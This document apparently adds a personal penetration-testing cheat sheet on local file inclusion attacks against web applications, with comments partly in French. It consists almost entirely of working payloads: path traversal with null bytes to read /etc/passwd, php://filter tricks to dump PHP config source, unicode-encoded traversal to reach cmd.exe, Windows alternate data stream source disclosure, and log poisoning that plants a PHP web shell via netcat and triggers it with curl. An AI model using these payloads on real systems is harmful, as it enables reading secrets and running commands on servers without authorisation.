@@ -1,0 +1,62 @@
+# lfi
+
+# http://ddxhunter.wordpress.com/2010/03/10/lfis-exploitation-techniques/
+/../../etc/passwd%00
+/../../var/log/httpd/access_log
+/proc/self/environ + User-Agent (no need to url-encode)
+
+# use filter to read a .php file (prevent it to be interpreted)
+index.php?page=php://filter/read=convert.base64-encode/resource=/path/to/config.php
+
+tester avec data://
+view-source:data://text/plain;base64,Ym9uam91cgo=
+
+# does a folder exist
+index.php?page=../../../../../../var/www/dossierexistant/../../../../../etc/passwd%00
+
+# PHP 5.3.4 
+NULL byte in paths fixed
+
+# windows
+use Alternate Data Streams
+../../test.txt:data.aspx
+type secret > test.txt:data.aspx
+type test.txt:data.aspx -> The filename syntax is incorrect
+more < test.txt:data.aspx 
+
+::$DATA to access the content of file (and not the ADS)
+show source code bypass: http://www.alternate-data-streams.com/default.asp::$DATA
+
+null byte: %c0%80
+fwd slash: ../%c0%af (because %80 + %2f == %af)
+old school 2000: http ://www.myserver.com/scripts/..%c0%af../winnt/system32/cmd.exe?c+dir+c:\
+many other ways to encoded the forward-slash and backslah in unicode:
+%c0%af %c1%9c %c1%pc %c0%qf %c1%8s %c1%1c %c1%af %e0%80%af
+source: http://www.sans.org/reading-room/whitepapers/threats/unicode-vulnerability-why-458
+
+# logs
+/proc/self/fd/10
+access_log
+general logs via ssh client banner
+nc 10.0.0.1 22
+<? system($_GET["cmd"]);exit; ?>
+
+curl 10.0.0.1/test.php?page=/var/log/auth.log&cmd=id
+
+# if you can upload files or images
+insert php code in file
+https://github.com/m101/lfipwn
+if you can use the zip:// handler, upload a png with a zip in the palette (polyglot) see plaid-ctf-2016 pixelshop
+
+# appsec usa 2013 schemes by platform
+* libxml2
+file, http, ftp
+* PHP
+file, http, ftp, php, compress.zlib, compress.bzip2, data, glob, phar
+* Java
+http, https, ftp, file, jar, netdoc, mailto, gopher (removed circa Sept 2012)
+file://proc/self//cwd/../config (evite de trouver le installdir de l'app)
+* .NET
+file, http, https, ftp
+
+also see ./ssrf
